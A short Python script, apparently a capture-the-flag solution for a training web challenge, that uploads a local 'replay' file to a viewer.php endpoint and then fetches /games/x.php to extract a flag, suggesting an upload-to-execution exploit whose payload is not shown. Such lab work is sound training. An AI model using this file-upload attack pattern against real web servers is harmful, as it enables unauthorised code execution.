import requests
import re


url = "http://1024.training.jinblack.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
	if search:
		print(search.group())

def upload_replay(s):
	files={"replay": ('replay', open('./replay', 'rb'))}
	return s.post(url+"/viewer.php", files=files).text

s = requests.Session()

upload_replay(s)

print(find_flag(s.get(url+"/games/x.php").text))
